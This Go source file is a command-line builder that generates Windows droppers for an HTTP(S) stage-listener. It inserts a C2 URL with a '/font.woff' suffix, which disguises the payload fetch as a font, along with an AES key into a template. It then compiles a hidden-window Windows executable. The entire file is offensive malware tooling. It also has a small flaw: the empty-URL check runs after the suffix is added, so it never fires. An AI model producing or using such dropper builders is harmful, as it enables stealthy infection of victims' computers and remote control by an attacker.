package main

import (
	"fmt"
	"html/template"
	"log"
	"os"
	"os/exec"

	"github.com/projectdiscovery/goflags"
)

type options struct {
	Url  string
	Key  string
	Save string
}

func main() {
	opt := &options{}

	flagSet := goflags.NewFlagSet()
	flagSet.SetDescription("Generate dropper for http(s) stage-listener")

	flagSet.StringVarP(&opt.Url, "url", "u", "", "eg:https://example.com stage-listener url")
	flagSet.StringVarP(&opt.Key, "key", "k", "", "aes encrypt key")
	flagSet.StringVarP(&opt.Save, "save", "s", "out/out.exe", "file location to save (Default ./out/out.exe)")

	if err := flagSet.Parse(); err != nil {
		log.Fatalf("Could not parse flags: %s\n", err)
	}

	opt.Url = opt.Url + "/font.woff"

	if opt.Url == "" || opt.Key == "" {
		log.Fatalf("Need both url and key!\n")
	}

	fmt.Printf("[+] Request: %s\n", opt.Url)
	fmt.Printf("[+] AES Key: %s\n", opt.Key)
	fmt.Printf("[+] Binary : %s\n", opt.Save)
	tmpl, err := template.New("main.tmpl").ParseFiles("./template/main.tmpl")
	if err != nil {
		panic(err)
	}

	f, err := os.Create("./template/main.go")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	if err := tmpl.Execute(f, opt); err != nil {
		panic(err)
	}

	cmd := exec.Command("go", "build", "-trimpath", "-ldflags", "-H=windowsgui", "-o", opt.Save,
		"template/main.go")
	cmd.Env = append(cmd.Environ(), "GOOS=windows", "GOARCH=amd64")
	_, err = cmd.Output()
	if err != nil {
		log.Fatal(err)
	}
}
